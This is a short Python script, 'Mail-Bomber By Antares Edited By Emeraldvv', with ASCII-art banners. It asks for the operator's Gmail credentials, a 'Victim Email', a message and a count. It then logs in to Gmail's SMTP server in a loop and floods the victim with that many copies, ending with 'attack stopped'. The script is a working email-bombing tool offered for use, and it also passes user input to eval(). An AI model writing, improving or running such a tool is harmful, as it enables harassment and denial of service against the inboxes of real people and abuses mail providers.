import sys, time
import smtplib

logo='''

                 .__ .__    ___.                     ___.                     
  _____  _____   |__||  |   \_ |__    ____    _____  \_ |__    ____  _______  
 /     \ \__  \  |  ||  |    | __ \  /  _ \  /     \  | __ \ _/ __ \ \_  __ \ 
|  Y Y  \ / __ \_|  ||  |__  | \_\ \(  <_> )|  Y Y  \ | \_\ \\  ___/  |  | \/ 
|__|_|  /(____  /|__||____/  |___  / \____/ |__|_|  / |___  / \___  > |__|    
      \/      \/                 \/               \/      \/      \/          
                                                                                '''
creator= ''' 

   __                           __                       
  / /   __ __      ___ _  ___  / /_ ___ _  ____ ___   ___
 / _ \ / // /     / _ `/ / _ \/ __// _ `/ / __// -_) (_-<
/_.__/ \_, /      \_,_/ /_//_/\__/ \_,_/ /_/   \__/ /___/  graphic by Emeraldvv
      /___/                                              

                                                              '''
print(logo)
print(creator)
time.sleep(2)
print("Mail-Bomber By Antares Edited By Emeraldvv")
print("---------------------------------------------")

email = raw_input("Your Email: ")
print("---------------------------------------------")
password = raw_input("Your Password: ")
print("---------------------------------------------")
destinatario = raw_input("Victim Email: ")
print("---------------------------------------------")
msg = raw_input("Message: ")
print("---------------------------------------------")
numeromail1 = eval(raw_input("Email Number: "))
print("---------------------------------------------")

try :
    for x in range(1, numeromail1+1):
      server = smtplib.SMTP("smtp.gmail.com",587)
      server.starttls()
      server.login(email, password)
      server.sendmail(email, destinatario, msg)
      print("Sending Email #" + str(x))
    server.quit()
    print("-------------------------------")
    print("attack stopped")
    print("-------------------------------")
except KeyboardInterrupt :
    print("Interrupting")
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print("Username or Password Invalid")
    print("-------------------------------")
    sys.exit()



